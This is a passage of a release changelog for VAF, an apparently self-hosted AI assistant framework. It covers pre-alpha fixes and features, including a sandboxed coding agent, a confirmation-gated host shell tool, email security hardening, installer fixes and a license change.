  coding task fail with "VAF Server unreachable (Port 8080)" (it wrongly fell back to the
  local-server path) while normal chat worked fine, or, with a leftover local llama-server
  still running, silently generated with the LOCAL model instead of the API. An unknown API
  provider now fails loudly instead of falling back, and a test keeps the coder's provider
  map in sync with the central provider list so this cannot drift again.
- **Chat messages no longer queue for minutes behind a coding run.** A crashed workflow step
  could leak an internal "run sub-agents in-process" flag into the long-running backend; after
  that, every coding task silently ran inside the chat turn itself instead of as a separate
  process - the window showed the coder working, but new messages waited in line until it
  finished. The flag is now restored even when a step fails, and the runner additionally clears
  a stale flag before every chat turn.

## [0.1.0a6] - 2026-07-04

### Added
- **The coding agent edits existing files surgically.** A new `edit_file` tool changes only the
  targeted text (exact search/replace, a unique match required, all-or-nothing) instead of
  rewriting the whole file, so a one-line fix no longer risks a full rewrite that drops the
  framework or unrelated code.

### Fixed
- **A coder task that restores from git history no longer stalls.** The version-history and
  restore tools (`git_log`, `project_history`, `project_rollback`) are now available while the
  agent executes a task, not only while it plans, and they run against the real project repo.
  `run_tests` also rejects a `git` or OS-package-install command sent as its shell command and
  points to the right tool, instead of failing silently inside its isolated test sandbox.
- **Tool calls that a model serializes as XML/text in the message body** are recovered and hidden
  instead of leaking into the visible reply.
- **"Allow always" for a directory persists again** - the trusted-directory list stays
  JSON-serializable.
- **The coding agent's console shows output immediately.** Removed the typewriter animation that
  made the live console lag behind the real timestamps.

## [0.1.0a5] - 2026-07-04

### Added
- **The coding agent can run its own tests.** A new `run_tests` tool runs the project's
  test suite inside the isolated Docker sandbox and returns the real pass/fail, so the coder
  verifies its work instead of asserting that "tests pass".
- **The coding agent's shell is confined to a kernel-jailed workspace.** Coder `bash` now runs
  inside a bubblewrap jail with full access to its project but with VAF's own source, config,
  secrets and the host docker socket structurally out of reach, and with networking unshared -
  a generated build can never reach or overwrite the running system. Host and docker tasks move
  to the main agent's new `host_bash` tool, which runs on the host under an explicit per-command
  confirmation and is blocked on remote messaging channels (Telegram/WhatsApp/Discord) in two
  layers, so it can never run unconfirmed from a chat message.
- **Deterministic ORIENT and DOCUMENT phases for the coder.** Before planning, an orientation
  scan feeds the existing project's file inventory into the planner, so edit tasks on an existing
  project no longer stall without making a change. After the build, a documentation phase creates
  or updates the README to reflect the run's real changes (detected via git) - generated projects
  are now documented, and an existing README is updated in place rather than overwritten.
- **Runnable scaffold templates.** Each coder template now ships a small working example (instead
  of an empty TODO) and a matching test that is green out of the box, giving even a small model a
  concrete pattern to adapt. Server and app templates are importable and testable, and the
  template chrome is English throughout.

### Fixed
- **Created Markdown and text files open in the in-app viewer** with a preview toggle instead of
  dead-ending.
- **The failover ("failsafe") level selector** no longer shows its connecting line through the
  hollow, unselected dots.

## [0.1.0a4] - 2026-07-04

### Fixed
- **Workflow/automation files stay in the run's chat workspace.** A workflow step that
  wrote a file with a bare relative name resolved it against the backend process working
  directory (the user's home root), where the file endpoint then refused to serve it -
  clicking the file chip navigated the whole desktop window to a raw `{"detail":"Access
  denied"}` page with no way back. Relative new-artifact paths in `write_file`/`move_file`
  steps now resolve against the shared per-run project directory; explicit absolute/`~`
  paths, folder aliases, and in-place updates of existing files are left untouched. The
  `WriteFileTool` home-reroute guard (dead for months due to a shadowed import) is
  restored, and the coder's CONTENT_ONLY cleanup only removes its own temp directories,
  never an injected workspace (which had deleted freshly written files).
- **Created-file chips never dead-end the UI.** Extension-less files open in the in-app
  viewer; downloads use the native Save-As bridge in the desktop window and a safe blob
  download in the browser, with a toast on failure instead of a full-window navigation.
  Raw file links are excluded from the desktop same-window link rewrite.
- **In-app update notes now appear for pre-alpha installs** whose stored acknowledgement
  used the old internal version numbering, and long release notes scroll inside the card.
- **Security:** refreshed the WhatsApp bridge and web dependency locks - all critical and
  high advisories resolved (63 of 64 alerts; the last is fixed by a future Next upgrade).

### Added
- VAF records itself as a co-author on commits it creates.

## [0.1.0a3] - 2026-07-03

### Added
- **In-app update notes.** After an update, the Web UI shows a one-time "What's new"
  window with the changes of the new version (same place as the first-run alpha
  notice; acknowledged per user). Alpha releases are now compared at full-version
  granularity so every release can carry notes.

### Fixed
- **Windows: installing without WSL2 no longer fails at the Rancher Desktop step.**
  The installer now checks WSL2 first (locale-independent, no admin needed for the
  check), enables it via a single UAC prompt when missing (no Linux distribution is
  installed; `dism` fallback for older Windows 10 builds), sets version 2 as the
  default, and pauses cleanly with resume instructions when Windows needs the
  restart (exit code 3010 is treated as a planned pause, not an error). An already
  running Linux container engine (e.g. Docker Desktop on Hyper-V) skips the check.

## [0.1.0a2] - 2026-07-03

### Fixed
- **First-run setup no longer races the database (all platforms, worst on Windows).**
  The Docker stack starts in parallel with the web server; when PostgreSQL was not
  ready in time (a first Rancher/WSL2 boot takes minutes), the auth tables were never
  created and a fresh install showed a login form with no account to log in to.
  Startup now gives the database a short head start, the auth-table init retries in
  the background until the database is ready (never giving up), and the login page
  shows "Starting the database..." and switches to the setup wizard on its own.
- **macOS: the memory stack starts even when the docker CLI lacks the compose
  plugin** (Homebrew docker + Colima: `docker compose` failed with
  `unknown shorthand flag: 'f'` while the standalone `docker-compose` binary was
  installed and working). VAF now detects the missing plugin and falls back to the
  legacy binary; real compose errors still surface unchanged.
- **Local model loads reliably (llama-server startup).** Server readiness now
  requires `/health` = 200 - llama-server answers 503 while the model is still
  loading, and accepting any response green-lit servers that died seconds later,
  causing an endless relaunch loop with orphaned processes. Slow cold loads get a
  generous configurable budget (`server_ready_timeout`) instead of being killed
  mid-load. When the backend has no Flash Attention kernel for the model (e.g.
  Qwen3.5 on Apple Metal), the quantized V cache made the server die at context
  init - VAF now retries once with an f16 V cache and remembers the outcome.
  Server output is always captured to `logs/server_last.log` (crashes left zero
  diagnostics before).
- **macOS: `model: "auto"` now scales with the machine.** Apple Silicon reported
  0 GB GPU memory, so every Mac downloaded the smallest 4B/Q4 model. The GPU
  budget is now 65% of unified memory (capped at RAM minus 6 GB for the OS and
  services), so e.g. a 32 GB Mac gets the 9B model while a 16 GB Mac stays on the
  4B tier that actually fits.
- **macOS: microphone/STT works in the desktop window.** The installer adds the
  microphone usage description to the host Python.app (with safe re-signing and
  rollback), and VAF grants WebKit microphone capture - scoped to the local WebUI
  origin and microphone-only, so pages loaded in-window (OAuth, model-card links)
  can never capture audio. Note: a `brew upgrade python@X.Y` reverts the plist
  patch; re-run `scripts/macos_mic_plist.sh` (the startup log warns about it).

### Changed
- Windows quickstart in the README works on stock PowerShell 5.1 (no `&&`,
  `install.bat` instead of calling `install.ps1` directly).

## [0.1.0a1] - 2026-07-01

### Fixed
- **macOS: VAF now starts.** The launcher (`run_vaf.sh`) exec'd the raw Homebrew
  framework Python instead of the venv's Python after activating the venv, so every
  dependency showed up as "missing" and startup failed (worse on a Homebrew Python
  3.14 machine, where it hunted for the 3.14 framework binary). It now runs
  `venv/bin/python` directly - a framework build, so the menu-bar tray still works,
  and it sees the installed packages.
- **macOS: the menu-bar tray icon no longer crashes** (`AssertionError: self.png
  is None`, resulting in no tray icon). The icon PNG was opened lazily and read by
  pystray from its own thread while being rewritten on every call; it is now decoded
  eagerly and written atomically (temp file + rename).
- **macOS: the onboarding step animation no longer "double-plays"** (jump up, snap
  back, then slow slide) in the WebKit/WKWebView desktop window - a framer-motion
  v10 WAAPI commit-timing re-read triggered by a reflow mid-transition. The steps
  now animate on the main thread via an `onUpdate` shim.

## [0.1.0a0] - 2026-06-30

### Changed
- **Thinking-mode proactive questions are now delivered to your configured main messenger**
  (Telegram/WhatsApp/Discord) and tracked as a request there, instead of only the Web UI. If a
  messenger question goes unanswered it is escalated once to the Web UI with a note that it was
  already asked on that channel; with no messenger configured the behaviour is unchanged. The
  background run now contacts you exclusively through `ask_user` (all raw `send_*` tools are removed
  from thinking runs), and `ask_user` carries the running user's real scope so a non-admin's question
  is never delivered to the admin's messenger. `send_whatsapp_reply` now reports real delivery, so a
  down WhatsApp bridge falls back to the Web UI instead of silently dropping the message.
- **License: relicensed from "MIT + Commons Clause v1.0" to a dual license - GNU
  AGPL-3.0-or-later (open source) plus a separate Commercial License.** `LICENSE` now
  carries the verbatim AGPL-3.0 text; see the new `LICENSING.md` (dual-license explanation,
  EN/DE) and `COMMERCIAL.md` (commercial/Enterprise terms). Building Plugins, Tools, and
  Workflows on top of VAF stays permission-free via an AGPL Section 7 additional permission.
  Contributor terms in `CONTRIBUTING.md` updated: contributions are accepted under the AGPL
  inbound plus a separate commercial-relicensing grant to Veyllo GmbH (so the dual-license
  model is enforceable), with a DCO `git commit -s` sign-off certifying origin. Source files
  now carry `SPDX-License-Identifier: AGPL-3.0-or-later` headers pointing to `LICENSING.md`.

### Added
- Vision-as-a-tool for attached images (`vision_mode: "description_tool"`, default):
  the main model is text-only - an attached image is described once via the vision
  backend, that description is injected as text, and the new `analyze_image` tool
  re-inspects the image on demand (exact colours, positions, small text, finding an
  object). Token-efficient, works even with a non-vision main provider, and the image
  description survives reloads / the worker pool. `vision_mode: "inline_multimodal"`
  restores the previous raw-image behaviour. New keys `vision_mode` /
  `vision_description_max_tokens`; see `docs/llm/API_INTEGRATION.md`. Uploaded images are
  now stored as **files** in the user-siloed chat folder
  (`VAF_Projects/<uid8>/<session_id>/attachments/`) with only the path in `session.json`
  (no more inline base64 bloat); the agent can reference them by path and the Web UI
  re-displays them after reload via `/api/file`. Legacy base64 sessions keep working.
- Embeddable library surface: `from vaf import Agent` (`docs/EMBEDDING.md`,
  `docs/ARCHITECTURE.md`); slim base install plus optional extras in `setup.py`.
- Entry-point tool discovery: third-party tools via the `vaf.tools` group.
- Tool input validation & repair before dispatch (`docs/agents/TOOL_INPUT_REPAIR.md`).
- Self-update: `vaf update check` / `vaf update`, an opt-in startup
  update-available hint, and a tag-triggered GitHub release workflow.
- Web search result cache: identical `web_search` queries are served from a
  short-lived file cache (default 15 min; `web_search_cache_enabled` /
  `web_search_cache_ttl_seconds`), skipping the providers and synthesis.
- Email subsystem hardening. **New config key `email_allow_private_hosts` (default
  `false`)**: IMAP/SMTP hosts that resolve to loopback / RFC-1918 private / link-local
  addresses (incl. the `169.254` metadata range) are refused as an SSRF guard unless this
  is enabled. IMAP/SMTP connections now verify TLS certificates against the system trust
  store (connect timeouts; port 465 uses implicit SMTP_SSL). `GET /api/config` redacts
  secret keys (`api_key_*`, `*_secret`, `*_password`, `memory_db_url`, `redis_url`,
  encryption keys, ...) for non-admin users; admins still receive everything.
  `POST /api/email/accounts/test` now requires authentication and is rate-limited (shared
  per-IP login limiter). OAuth PKCE state files (email + cloud) are written atomically with
  `0600` permissions, and token-endpoint errors are no longer logged verbatim.
- `send_mail` now supports `cc`, `bcc`, and reply threading via `in_reply_to` /
  `references`, with recipient-address validation.

### Fixed
- Filesystem alias resolution now matches only on a path boundary.
- `send_mail` no longer silently drops a single string attachment path.
- Mailbox authentication/connection failures now surface as an "authentication failed"
  error from `mail_inbox` / `read_mail` instead of an empty "no messages" result.
- Email headers (From/To/Subject) are now RFC 2047-decoded and message bodies are decoded
  with the part's declared charset (previously hardcoded UTF-8).
- Switching to an unowned/new session now resets the agent's current user scope/username,
  preventing cross-user identity bleed; UUID-scoped network users' mailboxes are now
  included in email auto-sync.
- Cloud storage OAuth (Google Drive etc.) now opens in the system browser instead of the
  embedded desktop webview, and its callback uses the same effective HTTPS proxy port as
  email (shared `vaf/network/oauth_redirect` helper) instead of an unreliable
  `request.base_url`, so connecting cloud accounts works on the Linux/macOS desktop.
- Cloud OAuth tokens for the local admin are found again: the cloud credential key is now
  normalized identically for storage and lookup (tokens were stored under the raw admin
  username but looked up normalized, causing a false "Credentials not found").

<!--
Template for a new release (see docs/setup/RELEASING.md):

## [X.Y.Z] - YYYY-MM-DD
### Added
### Changed
### Fixed
### Removed
-->
